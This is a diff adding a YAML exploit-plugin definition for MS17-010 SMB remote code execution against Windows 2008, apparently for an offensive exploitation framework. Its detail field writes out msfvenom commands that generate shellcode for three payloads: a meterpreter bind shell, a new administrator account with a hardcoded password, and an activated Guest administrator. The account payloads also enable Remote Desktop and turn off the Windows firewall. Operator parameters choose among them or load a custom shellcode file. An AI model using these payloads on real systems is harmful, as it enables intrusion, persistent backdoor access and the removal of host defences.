@@ -1,0 +1,43 @@
+info:
+    app: windows
+    name: MS17-010
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: 2017-03-14
+    create_date: "2024-10-06 09:32:37"
+    update_date: "2024-10-06 09:32:37"
+    scope: windows 2008
+    description: SMB远程代码执行
+    vul_id: MS17-010
+    detail: |-
+        选择指定payload利用
+
+        bind:
+        	msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=64531 -f hex
+
+        add
+        	msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user sysadmin "1qaz@WSX!@#4" /ADD && net localgroup Administrators sysadmin /ADD && REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex
+
+        guest:
+        	msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user Guest /active:yes && net user Guest "1qaz@WSX!@#4" && net localgroup Administrators Guest /ADD && REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex
+
+        file:
+        	读取cmd输入路径的shellcode进行利用
+payloads:
+    - name: cmd1
+      alias: RCE
+      params:
+          - key: cmd
+            title: cmd
+            param_type: edit
+            default_value: calc.bin
+            required: true
+          - key: payload
+            title: 载荷
+            param_type: textarea
+            default_value: |-
+                bind
+                add
+                guest
+                file
+            required: true
